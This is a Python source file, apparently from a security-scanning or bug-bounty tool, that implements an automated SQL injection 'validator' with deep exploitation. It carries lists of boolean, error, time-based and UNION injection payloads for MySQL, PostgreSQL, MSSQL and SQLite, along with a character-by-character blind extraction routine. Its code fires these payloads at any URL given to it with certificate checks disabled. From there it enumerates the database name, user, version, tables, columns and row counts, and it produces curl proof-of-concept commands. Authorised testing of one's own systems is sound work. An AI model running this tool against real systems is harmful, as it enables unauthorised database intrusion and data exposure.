from app.validation.safety.legacy import ValidationHTTPClient
"""SQL Injection Validation Engine — Deep Exploitation Evidence Architecture.

Upgraded to Full Proof-of-Exploitation:
- Error-based: SQL error detection + baseline disambiguation (normal input must NOT trigger same error)
- Boolean-based: TRIPLE verification with 3 independent TRUE/FALSE probe pairs + mathematical canary
- Time-based: ESCALATED triple-differential timing (5s, 7s, 10s) — must scale proportionally
- UNION-based: Column count detection → database/table/column extraction
- Database engine fingerprinting (MySQL, PostgreSQL, MSSQL, Oracle, SQLite)

Deep Exploitation (read-only, non-destructive):
- Database name extraction: database(), current_database(), db_name()
- Database user: user(), current_user(), system_user()
- Database version: version(), @@version
- Table enumeration: information_schema.tables
- Column enumeration: information_schema.columns
- Row count per table: COUNT(*)

Evidence Levels:
- E0/OBSERVED: Single signal without corroboration → observation only, not reported
- E1/SUSPECTED: Error-based with error pattern match but unverified → LOW severity
- E2/VALIDATED: Triple-verified boolean OR error-based with baseline disambiguation → HIGH severity
- E3/CONFIRMED: Time-based double differential + UNION column count → CRITICAL severity
- E4/EXPLOITED: Full database schema extracted with actual data → CRITICAL severity

All exploitation uses SELECT-only queries. No INSERT/UPDATE/DELETE/DROP.
"""

import hashlib
import logging
import re
import time
from dataclasses import dataclass, field
from typing import List, Optional, Tuple
from urllib.parse import parse_qs, quote, urlparse

import httpx

logger = logging.getLogger("validator.sqli")

# Safe differential probes (no data modification/extraction)
BOOLEAN_PROBES: List[Tuple[str, str]] = [
    ("' OR '1'='1", "' OR '1'='2"),       # Classic boolean
    ("' OR 1=1--", "' OR 1=2--"),          # Comment terminator
    ("1 OR 1=1", "1 OR 1=2"),              # Numeric boolean
    ("1) OR (1=1", "1) OR (1=2"),          # Parenthesized
    ("')) OR 1=1--", "')) AND 1=2--"),      # Nested parenthesized (Node/Sequelize)
    ("') OR 1=1--", "') AND 1=2--"),       # Single parenthesized
    ("' OR 'x'='x", "' OR 'x'='y"),       # String comparison
    ("1' AND 1=1#", "1' AND 1=2#"),        # MySQL comment
]

# Mathematical canary probes for confirmation after boolean detection
MATH_CANARY_PROBES: List[Tuple[str, str, str]] = [
    ("' OR 7*7=49--", "' OR 7*7=50--", "49"),         # Multiplication
    ("' AND 3+4=7--", "' AND 3+4=8--", "7"),           # Addition
    ("' OR 100/10=10--", "' OR 100/10=11--", "10"),    # Division
]

# Escalated time probes: (probe_template, delay_seconds, engine)
# Uses {delay} placeholder for variable delay injection
TIME_PROBES_ESCALATED: List[Tuple[str, str, str]] = [
    ("' OR SLEEP({delay})-- -", "' OR SLEEP(0)-- -", "MySQL"),
    ("'; WAITFOR DELAY '0:0:{delay}'--", "'; WAITFOR DELAY '0:0:0'--", "MSSQL"),
    ("' OR pg_sleep({delay})--", "' OR pg_sleep(0)--", "PostgreSQL"),
]

# Escalation delay sequence — each must scale proportionally
ESCALATION_DELAYS = [5, 7, 10]

# UNION-based column count probes (non-destructive — only determines column count)
UNION_PROBES = [
    "' UNION SELECT NULL-- -",
    "' UNION SELECT NULL,NULL-- -",
    "' UNION SELECT NULL,NULL,NULL-- -",
    "' UNION SELECT NULL,NULL,NULL,NULL-- -",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL-- -",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -",
    "')) UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -",
]

# UNION-based data extraction queries per DBMS (read-only SELECT only)
UNION_EXTRACTION = {
    "MySQL": {
        "db_name": "database()",
        "db_user": "user()",
        "db_version": "version()",
        "tables": "GROUP_CONCAT(table_name SEPARATOR ',') FROM information_schema.tables WHERE table_schema=database()",
        "columns": "GROUP_CONCAT(column_name SEPARATOR ',') FROM information_schema.columns WHERE table_schema=database() AND table_name='{table}'",
        "row_count": "COUNT(*) FROM `{table}`",
    },
    "PostgreSQL": {
        "db_name": "current_database()",
        "db_user": "current_user",
        "db_version": "version()",
        "tables": "string_agg(table_name, ',') FROM information_schema.tables WHERE table_schema='public'",
        "columns": "string_agg(column_name, ',') FROM information_schema.columns WHERE table_schema='public' AND table_name='{table}'",
        "row_count": "COUNT(*) FROM \"{table}\"",
    },
    "MSSQL": {
        "db_name": "DB_NAME()",
        "db_user": "SYSTEM_USER",
        "db_version": "@@VERSION",
        "tables": "STRING_AGG(table_name, ',') FROM information_schema.tables WHERE table_type='BASE TABLE'",
        "columns": "STRING_AGG(column_name, ',') FROM information_schema.columns WHERE table_name='{table}'",
        "row_count": "COUNT(*) FROM [{table}]",
    },
    "SQLite": {
        "db_name": "sqlite_version()",
        "db_user": "'sqlite_user'",
        "db_version": "sqlite_version()",
        "tables": "GROUP_CONCAT(name, ',') FROM sqlite_master WHERE type='table'",
        "columns": "GROUP_CONCAT(name, ',') FROM pragma_table_info('{table}')",
        "row_count": "COUNT(*) FROM \"{table}\"",
    },
}

# Error patterns that indicate SQL injection + database engine fingerprinting
SQL_ERROR_PATTERNS = [
    (re.compile(r"(SQL syntax.*?MySQL|mysql_fetch|mysql_num_rows|MySQL server version)", re.I), "MySQL"),
    (re.compile(r"(Warning:.*mysql_|PDOException.*mysql|MySQLi)", re.I), "MySQL"),
    (re.compile(r"(ORA-\d{4,5}|Oracle.*Driver|oracle\.jdbc)", re.I), "Oracle"),
    (re.compile(r"(PG::Error|pg_query\(\)|pg_exec\(\)|PostgreSQL.*ERROR)", re.I), "PostgreSQL"),
    (re.compile(r"(Unclosed quotation mark|Microsoft OLE DB|ODBC SQL Server|mssql_query\(\))", re.I), "MSSQL"),
    (re.compile(r"(sqlite3\.OperationalError|SQLite\/JDBCDriver|System\.Data\.SQLite|SQLITE_ERROR|SQLITE_CORRUPT|near \".*?\": syntax error)", re.I), "SQLite"),
    (re.compile(r"(SequelizeDatabaseError|SequelizeConnectionError|SequelizeValidationError)", re.I), "SQLite/Sequelize"),
    (re.compile(r"(java\.sql\.SQLException|JDBC|Hibernate.*SQL)", re.I), "Unknown"),
    (re.compile(r"(quoted string not properly terminated|syntax error at or near)", re.I), "Unknown"),
    (re.compile(r"(Dynamic SQL Error|SQL command not properly ended)", re.I), "Unknown"),
]

# Database version extraction patterns (from error messages — non-destructive)
DB_VERSION_PATTERNS = {
    "MySQL": re.compile(r"MySQL.*?(\d+\.\d+\.\d+)", re.I),
    "PostgreSQL": re.compile(r"PostgreSQL.*?(\d+\.\d+)", re.I),
    "MSSQL": re.compile(r"Microsoft SQL Server.*?(\d+\.\d+\.\d+)", re.I),
    "Oracle": re.compile(r"Oracle.*?(\d+\.\d+\.\d+)", re.I),
    "SQLite": re.compile(r"SQLite.*?(\d+\.\d+\.\d+)", re.I),
}


@dataclass
class SQLiCandidate:
    url: str
    parameter: str
    location: str
    technique: str  # boolean, error, time, union
    confidence: str = "OBSERVED"
    db_engine: str = "Unknown"
    db_version: str = ""
    column_count: int = 0
    evidence: dict = field(default_factory=dict)
    exploitation_data: dict = field(default_factory=dict)  # Deep exploitation proof
    impact_matrix: dict = field(default_factory=dict)
    poc_curl: str = ""
    reproduction_steps: list = field(default_factory=list)


class SQLiValidator:
    """Zero false-positive SQL Injection validator with deep exploitation evidence.

    Pipeline:
        Parameter → Baseline → Error-based (with baseline disambiguation)
        → Boolean triple-verification → Mathematical canary confirmation
        → Time-based ESCALATED triple-differential (5s/7s/10s)
        → UNION column count → UNION data extraction
        → Impact → Evidence → PoC
    """

    def __init__(self, timeout: float = 15.0, max_params: int = 30) -> None:
        self.timeout = timeout
        self.max_params = max_params

    async def validate_url(
        self,
        url: str,
        parameters: List[dict],
        *,
        headers: Optional[dict] = None,
    ) -> List[SQLiCandidate]:
        """Test all parameters for SQL injection with strict false-positive prevention."""
        candidates: List[SQLiCandidate] = []

        for param in parameters[:self.max_params]:
            name = param.get("name", "")
            location = param.get("location", "query")
            if not name or location not in ("query", "body"):
                continue

            # 1. Error-based detection with baseline disambiguation
            error_candidate = await self._test_error_based(url, name, location, headers)
            if error_candidate:
                # Attempt UNION column count for deeper proof (E3)
                if error_candidate.confidence in ("VALIDATED", "CONFIRMED"):
                    column_count = await self._test_union_columns(url, name, location, headers)
                    if column_count > 0:
                        error_candidate.column_count = column_count
                        error_candidate.confidence = "CONFIRMED"
                        error_candidate.evidence["column_count"] = column_count
                        error_candidate.evidence["evidence_level"] = "E3"

                        # Deep exploitation: extract database schema
                        exploitation = await self._exploit_union_extraction(
                            url, name, location, column_count,
                            error_candidate.db_engine, headers,
                        )
                        if exploitation:
                            error_candidate.exploitation_data = exploitation
                            error_candidate.confidence = "EXPLOITED"
                            error_candidate.evidence["evidence_level"] = "E4"

                self._enrich_candidate(error_candidate, url, name, location)
                candidates.append(error_candidate)
                continue

            # 2. Boolean-based TRIPLE verification
            bool_candidate = await self._test_boolean_triple(url, name, location, headers)
            if bool_candidate:
                # Try UNION exploitation if boolean confirmed
                column_count = await self._test_union_columns(url, name, location, headers)
                if column_count > 0:
                    bool_candidate.column_count = column_count
                    bool_candidate.evidence["column_count"] = column_count

                    exploitation = await self._exploit_union_extraction(
                        url, name, location, column_count,
                        bool_candidate.db_engine or "MySQL", headers,
                    )
                    if exploitation:
                        bool_candidate.exploitation_data = exploitation
                        bool_candidate.confidence = "EXPLOITED"
                        bool_candidate.evidence["evidence_level"] = "E4"

                self._enrich_candidate(bool_candidate, url, name, location)
                candidates.append(bool_candidate)
                continue

            # 3. Time-based blind detection (escalated triple-differential)
            time_candidate = await self._test_time_based_escalated(url, name, location, headers)
            if time_candidate:
                self._enrich_candidate(time_candidate, url, name, location)
                candidates.append(time_candidate)

        logger.info("SQLi validation: %d candidates found on %s", len(candidates), url)
        return candidates

    def _enrich_candidate(
        self, candidate: SQLiCandidate, url: str, param: str, location: str
    ) -> None:
        """Add impact matrix, PoC curl, and reproduction steps."""
        candidate.impact_matrix = {
            "confidentiality": "HIGH",
            "integrity": "MEDIUM",
            "availability": "MEDIUM",
            "authentication_bypass": "Possible",
            "data_exposure": "HIGH",
            "lateral_movement": "Low",
            "business_impact": "Unauthorized database-level data access",
        }

        probe = candidate.evidence.get("probe") or candidate.evidence.get("true_probe", "")
        candidate.poc_curl = self._generate_curl(url, param, probe, location)
        candidate.evidence["poc_curl"] = candidate.poc_curl

        candidate.reproduction_steps = [
            f"1. Akses target URL: {url}",
            f"2. Injeksikan payload pada parameter '{param}' ({location})",
            f"3. Payload Terkontrol: {probe}",
            f"4. Jalankan perintah cURL PoC yang valid:\n```bash\n{candidate.poc_curl}\n```",
            f"5. Amati {'pesan kesalahan SQL eksplisit' if candidate.technique == 'error' else 'perubahan perilaku / delay respons basis data'}",
            f"6. Mesin basis data teridentifikasi: {candidate.db_engine}",
        ]
        if candidate.column_count > 0:
            candidate.reproduction_steps.append(
                f"7. Konfirmasi jumlah kolom UNION: {candidate.column_count} kolom"
            )
        if candidate.exploitation_data:
            expl = candidate.exploitation_data
            if expl.get("database_name"):
                candidate.reproduction_steps.append(
                    f"8. Database name extracted: {expl['database_name']}"
                )
            if expl.get("tables"):
                candidate.reproduction_steps.append(
                    f"9. Tables extracted: {', '.join(expl['tables'][:10])}"
                )
            if expl.get("columns"):
                for tbl, cols in list(expl["columns"].items())[:3]:
                    candidate.reproduction_steps.append(
                        f"10. Columns in '{tbl}': {', '.join(cols[:10])}"
                    )

    async def _send_request(
        self,
        url: str,
        param_name: str,
        value: str,
        location: str,
        headers: Optional[dict] = None,
        timeout: Optional[float] = None,
    ) -> Optional[httpx.Response]:
        """Send a request with the given parameter value properly URL-encoded."""
        try:
            async with ValidationHTTPClient(
                timeout=timeout or self.timeout,
                follow_redirects=True,
                verify=False,
            ) as client:
                if location == "query":
                    parsed = urlparse(url)
                    base_url = f"{parsed.scheme or 'https'}://{parsed.netloc}{parsed.path or '/'}"
                    query_params = parse_qs(parsed.query, keep_blank_values=True)
                    flat_params = {k: v[0] if isinstance(v, list) and v else "" for k, v in query_params.items()}
                    flat_params[param_name] = value
                    return await client.get(base_url, params=flat_params, headers=headers or {})
                else:
                    return await client.post(
                        url,
                        data={param_name: value},
                        headers=headers or {},
                    )
        except Exception:
            return None

    async def _test_error_based(
        self,
        url: str,
        param_name: str,
        location: str,
        headers: Optional[dict] = None,
    ) -> Optional[SQLiCandidate]:
        """Test for SQL error messages with baseline disambiguation.

        Key improvement: Send a NORMAL (non-SQLi) input first.
        If normal input ALSO triggers SQL error pattern → it's a template/framework error page, NOT SQLi.
        """
        # Step 1: Baseline with normal input — check if error patterns appear without injection
        baseline_resp = await self._send_request(url, param_name, "normalvalue12345", location, headers)
        if baseline_resp:
            baseline_body = baseline_resp.text
            baseline_has_error = any(pattern.search(baseline_body) for pattern, _ in SQL_ERROR_PATTERNS)
        else:
            baseline_has_error = False

        # Step 2: Send single-quote probe to trigger SQL syntax error
        probe = "'"
        resp = await self._send_request(url, param_name, probe, location, headers)
        if not resp:
            return None

        body = resp.text
        for pattern, db_engine in SQL_ERROR_PATTERNS:
            match = pattern.search(body)
            if match:
                # CRITICAL: If baseline also had SQL error patterns, this is NOT injection
                if baseline_has_error:
                    logger.debug(
                        "SQLi: Error pattern '%s' also present in baseline response for param '%s' — false positive, skipping",
                        match.group(0)[:50], param_name,
                    )
                    return None

                # Try to extract database version
                db_version = ""
                if db_engine in DB_VERSION_PATTERNS:
                    ver_match = DB_VERSION_PATTERNS[db_engine].search(body)
                    if ver_match:
                        db_version = ver_match.group(1)

                return SQLiCandidate(
                    url=url,
                    parameter=param_name,
                    location=location,
                    technique="error",
                    confidence="VALIDATED",
                    db_engine=db_engine,
                    db_version=db_version,
                    evidence={
                        "probe": probe,
                        "status_code": resp.status_code,
                        "error_pattern": match.group(0)[:200],
                        "db_engine": db_engine,
                        "db_version": db_version or "not_disclosed",
                        "baseline_clean": not baseline_has_error,
                        "response_hash": hashlib.sha256(body.encode()).hexdigest()[:16],
                        "evidence_level": "E2",
                    },
                )
        return None

    async def _test_boolean_triple(
        self,
        url: str,
        param_name: str,
        location: str,
        headers: Optional[dict] = None,
    ) -> Optional[SQLiCandidate]:
        """Triple-verification boolean-based blind injection.

        Requires at least 3 independent boolean probe pairs to ALL show consistent differential.
        Then confirms with mathematical canary probe for E2→E3 upgrade.
        """
        # Get baseline
        baseline_resp = await self._send_request(url, param_name, "1", location, headers)
        if not baseline_resp:
            return None
        baseline_len = len(baseline_resp.text)
        baseline_status = baseline_resp.status_code

        # Need minimum 3 consistent differentials out of all probes
        verified_probes: List[Tuple[str, str, int, int]] = []

        for true_probe, false_probe in BOOLEAN_PROBES:
            true_resp = await self._send_request(url, param_name, true_probe, location, headers)
            false_resp = await self._send_request(url, param_name, false_probe, location, headers)

            if not true_resp or not false_resp:
                continue

            true_len = len(true_resp.text)
            false_len = len(false_resp.text)

            # Significant length differential between TRUE and FALSE conditions
            if (
                true_resp.status_code == baseline_status
                and abs(true_len - baseline_len) < baseline_len * 0.1
                and abs(false_len - baseline_len) > baseline_len * 0.2
            ):
                verified_probes.append((true_probe, false_probe, true_len, false_len))

            # Stop early if we have enough verified probes
            if len(verified_probes) >= 3:
                break

        # TRIPLE VERIFICATION: Need at least 3 consistent differentials
        if len(verified_probes) < 3:
            return None

        # Mathematical canary confirmation for E3 upgrade
        canary_confirmed = False
        canary_detail = ""
        for canary_true, canary_false, expected_val in MATH_CANARY_PROBES:
            true_resp = await self._send_request(url, param_name, canary_true, location, headers)
            false_resp = await self._send_request(url, param_name, canary_false, location, headers)

            if true_resp and false_resp:
                true_len = len(true_resp.text)
                false_len = len(false_resp.text)
                # Mathematical canary: TRUE math should match baseline, FALSE should differ
                if (
                    abs(true_len - baseline_len) < baseline_len * 0.1
                    and abs(false_len - baseline_len) > baseline_len * 0.15
                ):
                    canary_confirmed = True
                    canary_detail = f"{canary_true} vs {canary_false}"
                    break

        confidence = "CONFIRMED" if canary_confirmed else "VALIDATED"
        evidence_level = "E3" if canary_confirmed else "E2"

        first_true, first_false, first_true_len, first_false_len = verified_probes[0]

        return SQLiCandidate(
            url=url,
            parameter=param_name,
            location=location,
            technique="boolean",
            confidence=confidence,
            evidence={
                "true_probe": first_true,
                "false_probe": first_false,
                "baseline_length": baseline_len,
                "true_length": first_true_len,
                "false_length": first_false_len,
                "length_differential": abs(first_true_len - first_false_len),
                "baseline_status": baseline_status,
                "verified_probe_count": len(verified_probes),
                "triple_verified": len(verified_probes) >= 3,
                "math_canary_confirmed": canary_confirmed,
                "math_canary_detail": canary_detail,
                "evidence_level": evidence_level,
            },
        )

    async def _test_time_based_escalated(
        self,
        url: str,
        param_name: str,
        location: str,
        headers: Optional[dict] = None,
    ) -> Optional[SQLiCandidate]:
        """Escalated time-based blind injection with triple-differential (5s, 7s, 10s).

        For each DBMS probe family:
        1. Zero-delay negative control (should be fast)
        2. Escalated delays: 5s → 7s → 10s — ALL must match proportionally
        3. Only if all 3 delays are consistent → CONFIRMED

        After confirmation, attempt blind data extraction.
        """
        # 1. Capture baseline timing
        t0 = time.monotonic()
        baseline_resp = await self._send_request(url, param_name, "1", location, headers)
        baseline_time = time.monotonic() - t0

        if not baseline_resp:
            return None

        for delay_template, zero_template, db_engine in TIME_PROBES_ESCALATED:
            # 2. Zero-delay negative control
            zero_probe = zero_template
            t0 = time.monotonic()
            resp_zero = await self._send_request(url, param_name, zero_probe, location, headers)
            time_zero = time.monotonic() - t0

            if not resp_zero:
                continue

            # If zero-delay probe itself takes too long, network is unstable
            if time_zero > baseline_time + 1.5:
                continue

            # 3. Escalated triple-differential: 5s, 7s, 10s
            escalation_results = []
            all_passed = True

            for delay_seconds in ESCALATION_DELAYS:
                probe = delay_template.replace("{delay}", str(delay_seconds))
                probe_timeout = delay_seconds + 8.0  # generous timeout

                t0 = time.monotonic()
                resp = await self._send_request(
                    url, param_name, probe, location, headers,
                    timeout=probe_timeout,
                )
                elapsed = time.monotonic() - t0

                # Must be at least 75% of expected delay above zero-control baseline
                expected_min = time_zero + delay_seconds * 0.75
                if resp and elapsed >= expected_min:
                    escalation_results.append({
                        "delay_requested": delay_seconds,
                        "elapsed_ms": round(elapsed * 1000),
                        "expected_min_ms": round(expected_min * 1000),
                        "probe": probe,
                        "status_code": resp.status_code,
                    })
                else:
                    all_passed = False
                    break

            if not all_passed or len(escalation_results) < 3:
                continue

            # 4. Verify proportional scaling: each delay should increase roughly proportionally
            times = [r["elapsed_ms"] for r in escalation_results]
            # 7s should be more than 5s, 10s should be more than 7s
            if times[1] > times[0] + 1000 and times[2] > times[1] + 1000:
                # CONFIRMED! Now attempt blind data extraction
                exploitation_data = await self._exploit_time_based_blind(
                    url, param_name, location, delay_template, db_engine, headers,
                )

                confidence = "EXPLOITED" if exploitation_data else "CONFIRMED"
                evidence_level = "E4" if exploitation_data else "E3"

                return SQLiCandidate(
                    url=url,
                    parameter=param_name,
                    location=location,
                    technique="time",
                    confidence=confidence,
                    db_engine=db_engine,
                    evidence={
                        "zero_probe": zero_probe,
                        "db_engine": db_engine,
                        "baseline_time_ms": round(baseline_time * 1000),
                        "zero_control_time_ms": round(time_zero * 1000),
                        "escalation_results": escalation_results,
                        "proportional_scaling_verified": True,
                        "evidence_level": evidence_level,
                    },
                    exploitation_data=exploitation_data or {},
                )
        return None

    async def _exploit_time_based_blind(
        self,
        url: str,
        param_name: str,
        location: str,
        delay_template: str,
        db_engine: str,
        headers: Optional[dict] = None,
    ) -> Optional[dict]:
        """Extract database info via time-based blind injection (character-by-character).

        Uses conditional sleep to extract:
        - Database name (max 30 chars)
        - Database version first 20 chars
        - Database user first 20 chars
        """
        extraction = {}

        # Build conditional sleep templates per DBMS
        if db_engine == "MySQL":
            db_name_template = "' OR IF(SUBSTRING(database(),{pos},1)='{char}',SLEEP(3),0)-- -"
            db_user_template = "' OR IF(SUBSTRING(user(),{pos},1)='{char}',SLEEP(3),0)-- -"
            db_version_template = "' OR IF(SUBSTRING(version(),{pos},1)='{char}',SLEEP(3),0)-- -"
        elif db_engine == "PostgreSQL":
            db_name_template = "' OR CASE WHEN SUBSTRING(current_database(),{pos},1)='{char}' THEN pg_sleep(3) ELSE pg_sleep(0) END-- -"
            db_user_template = "' OR CASE WHEN SUBSTRING(current_user::text,{pos},1)='{char}' THEN pg_sleep(3) ELSE pg_sleep(0) END-- -"
            db_version_template = "' OR CASE WHEN SUBSTRING(version(),{pos},1)='{char}' THEN pg_sleep(3) ELSE pg_sleep(0) END-- -"
        elif db_engine == "MSSQL":
            db_name_template = "'; IF SUBSTRING(DB_NAME(),{pos},1)='{char}' WAITFOR DELAY '0:0:3'--"
            db_user_template = "'; IF SUBSTRING(SYSTEM_USER,{pos},1)='{char}' WAITFOR DELAY '0:0:3'--"
            db_version_template = "'; IF SUBSTRING(@@VERSION,{pos},1)='{char}' WAITFOR DELAY '0:0:3'--"
        else:
            return None

        charset = "abcdefghijklmnopqrstuvwxyz0123456789_-.@"

        # Extract database name (max 30 chars)
        db_name = await self._blind_extract_string(
            url, param_name, location, db_name_template, charset, headers, max_len=30,
        )
        if db_name:
            extraction["database_name"] = db_name

        # Extract database user (max 20 chars)
        db_user = await self._blind_extract_string(
            url, param_name, location, db_user_template, charset + "\\", headers, max_len=20,
        )
        if db_user:
            extraction["database_user"] = db_user

        # Extract database version (max 20 chars)
        db_version = await self._blind_extract_string(
            url, param_name, location, db_version_template, charset + ".()+/ ", headers, max_len=20,
        )
        if db_version:
            extraction["database_version"] = db_version

        return extraction if extraction else None

    async def _blind_extract_string(
        self,
        url: str,
        param_name: str,
        location: str,
        template: str,
        charset: str,
        headers: Optional[dict] = None,
        max_len: int = 30,
    ) -> str:
        """Extract a string character by character via time-based blind injection."""
        result = ""

        for pos in range(1, max_len + 1):
            found_char = False
            for char in charset:
                probe = template.replace("{pos}", str(pos)).replace("{char}", char)

                t0 = time.monotonic()
                resp = await self._send_request(
                    url, param_name, probe, location, headers, timeout=8.0,
                )
                elapsed = time.monotonic() - t0

                if resp and elapsed >= 2.5:  # 3s sleep, 2.5s threshold
                    result += char
                    found_char = True
                    logger.debug("Blind SQLi extraction: pos=%d char='%s' elapsed=%.1fs", pos, char, elapsed)
                    break

            if not found_char:
                break  # End of string or character not in charset

        return result

    async def _test_union_columns(
        self,
        url: str,
        param_name: str,
        location: str,
        headers: Optional[dict] = None,
    ) -> int:
        """Test for UNION SELECT column count (non-destructive)."""
        error_baseline = await self._send_request(url, param_name, "' UNION SELECT 1-- -", location, headers)
        if not error_baseline:
            return 0

        error_len = len(error_baseline.text)

        for i, probe in enumerate(UNION_PROBES, start=1):
            resp = await self._send_request(url, param_name, probe, location, headers)
            if not resp:
                continue

            resp_len = len(resp.text)
            if resp.status_code == 200 and abs(resp_len - error_len) > error_len * 0.15:
                return i

            is_error = any(
                pattern.search(resp.text)
                for pattern, _ in SQL_ERROR_PATTERNS
            )
            if not is_error and error_baseline.status_code != resp.status_code:
                return i

        return 0

    async def _exploit_union_extraction(
        self,
        url: str,
        param_name: str,
        location: str,
        column_count: int,
        db_engine: str,
        headers: Optional[dict] = None,
    ) -> Optional[dict]:
        """Extract database schema via UNION-based injection (read-only SELECT only).

        Extracts: database name, user, version, table names, column names per table.
        """
        engine_key = db_engine
        if engine_key not in UNION_EXTRACTION:
            # Try to find a matching key
            for key in UNION_EXTRACTION:
                if key.lower() in db_engine.lower():
                    engine_key = key
                    break
            else:
                engine_key = "MySQL"  # default fallback

        queries = UNION_EXTRACTION[engine_key]
        exploitation = {}

        def _build_union(select_expr: str) -> str:
            """Build a UNION SELECT payload placing select_expr in the first visible column."""
            cols = []
            for i in range(column_count):
                if i == 0:
                    cols.append(select_expr)
                else:
                    cols.append("NULL")
            return f"' UNION SELECT {','.join(cols)}-- -"

        # 1. Extract database name
        db_name = await self._union_extract_value(
            url, param_name, location,
            _build_union(queries["db_name"]),
            headers,
        )
        if db_name:
            exploitation["database_name"] = db_name

        # 2. Extract database user
        db_user = await self._union_extract_value(
            url, param_name, location,
            _build_union(queries["db_user"]),
            headers,
        )
        if db_user:
            exploitation["database_user"] = db_user

        # 3. Extract database version
        db_version = await self._union_extract_value(
            url, param_name, location,
            _build_union(queries["db_version"]),
            headers,
        )
        if db_version:
            exploitation["database_version"] = db_version

        # 4. Extract table names
        tables_payload = _build_union(queries["tables"])
        tables_raw = await self._union_extract_value(
            url, param_name, location, tables_payload, headers,
        )
        if tables_raw:
            tables = [t.strip() for t in tables_raw.split(",") if t.strip()][:10]
            exploitation["tables"] = tables

            # 5. Extract columns for first 5 tables
            columns = {}
            for table_name in tables[:5]:
                col_query = queries["columns"].replace("{table}", table_name)
                col_payload = _build_union(col_query)
                cols_raw = await self._union_extract_value(
                    url, param_name, location, col_payload, headers,
                )
                if cols_raw:
                    columns[table_name] = [c.strip() for c in cols_raw.split(",") if c.strip()][:10]

            if columns:
                exploitation["columns"] = columns

            # 6. Get row counts for first 3 tables
            row_counts = {}
            for table_name in tables[:3]:
                count_query = queries["row_count"].replace("{table}", table_name)
                count_payload = _build_union(count_query)
                count_raw = await self._union_extract_value(
                    url, param_name, location, count_payload, headers,
                )
                if count_raw and count_raw.isdigit():
                    row_counts[table_name] = int(count_raw)

            if row_counts:
                exploitation["row_counts"] = row_counts

        return exploitation if exploitation else None

    async def _union_extract_value(
        self,
        url: str,
        param_name: str,
        location: str,
        payload: str,
        headers: Optional[dict] = None,
    ) -> Optional[str]:
        """Send UNION payload and extract the injected value from response diff."""
        # Get baseline first
        baseline_resp = await self._send_request(url, param_name, "1", location, headers)
        if not baseline_resp:
            return None

        # Send UNION payload
        exploit_resp = await self._send_request(url, param_name, payload, location, headers)
        if not exploit_resp or exploit_resp.status_code != 200:
            return None

        baseline_text = baseline_resp.text
        exploit_text = exploit_resp.text

        # Find new content that appears in exploit but not in baseline
        # Look for values that appear between common HTML delimiters
        # Strategy: find lines in exploit that are NOT in baseline
        baseline_lines = set(baseline_text.splitlines())
        exploit_lines = exploit_text.splitlines()

        new_content = []
        for line in exploit_lines:
            stripped = line.strip()
            if stripped and line not in baseline_lines and stripped not in ("NULL", "null"):
                # Remove HTML tags
                clean = re.sub(r"<[^>]+>", "", stripped).strip()
                if clean and clean not in ("NULL", "null", "", " "):
                    new_content.append(clean)

        if new_content:
            # Return the most meaningful new content (longest non-HTML string)
            best = max(new_content, key=len)
            if len(best) > 1:
                return best

        return None

    @staticmethod
    def _generate_curl(url: str, param_name: str, payload: str, location: str) -> str:
        """Generate valid, syntax-safe, properly encoded curl PoC reproduction command."""
        parsed = urlparse(url)
        base_url = f"{parsed.scheme or 'https'}://{parsed.netloc}{parsed.path or '/'}"
        query_params = parse_qs(parsed.query, keep_blank_values=True)
        flat_params = {k: v[0] if isinstance(v, list) and v else "" for k, v in query_params.items()}

        if location == "query":
            flat_params[param_name] = payload
            query_str = "&".join(f"{quote(str(k), safe='')}={quote(str(v), safe='')}" for k, v in flat_params.items())
            final_url = f"{base_url}?{query_str}" if query_str else base_url
            return f"curl -i -s -k -X GET '{final_url}' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) HunterAja/9.1.0'"
        else:
            flat_params[param_name] = payload
            data_str = "&".join(f"{quote(str(k), safe='')}={quote(str(v), safe='')}" for k, v in flat_params.items())
            return f"curl -i -s -k -X POST '{base_url}' -d '{data_str}' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) HunterAja/9.1.0'"


sqli_validator = SQLiValidator()
